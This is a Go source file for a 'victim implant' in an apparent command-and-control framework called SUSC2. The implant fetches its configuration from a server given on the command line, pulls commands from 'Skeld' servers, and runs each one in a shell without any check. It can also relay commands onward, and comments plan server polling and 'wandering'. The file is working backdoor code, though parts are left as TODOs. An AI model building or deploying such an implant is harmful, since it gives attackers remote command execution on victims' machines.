//Victim Implant for SUSC2

package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"sync"

	"github.com/TheRealChrisM/SUSC2/pkg/interop"
	"github.com/TheRealChrisM/SUSC2/pkg/skserver"
)

var config interop.Config
var mu sync.RWMutex
var runStream = make(chan string)

func getConfig(server string) (interop.Config, error) {
	resp, err := http.Get(server + "/setup")
	if err != nil {
		return interop.Config{}, err
	}
	b, err := io.ReadAll(resp.Body)
	if err != nil {
		return interop.Config{}, err
	}
	var conf interop.Config
	err = json.Unmarshal(b, &conf)
	if err != nil {
		return interop.Config{}, err
	}
	return conf, nil
}

func run() { // TODO add targeting logic?
	for c := range runStream {
		exec.Command("sh", "-c", c).Start()
	}
}

func scan() { // remember to Lock() when updating the config
	// TODO scan for new servers
}

func main() {
	//Attempt to gather config from Skeld server.
	var address string = os.Args[1]

	relay := false

	config, err := getConfig(address)
	if err != nil {
		panic(err)
	}
	fmt.Print(config)
	pullStream := make(chan string)
	pushStream := make(chan string)

	go run()
	go skserver.Fetch(&config, &mu, &pullStream)
	go scan()

	go func() {
		for c := range pullStream {
			runStream <- c
			pushStream <- c
		}
	}()

	if relay {
		go skserver.Serve(&pushStream)
	} else {
		go func() {
			for range pushStream {

			}
		}()
	}

	//Poll Skeld servers to make sure MIN(num_servers, 3) are known and functional.

	//If there are no working Skeld servers left, start wandering...

	//... Otherwise, pick a random Skeld server from the polled and known-working ones to check for new tasks.

	//Get the tasks from the server, loop through them, and execute.

	//Maybe buffer everything before sending?

	//eppy boi
}
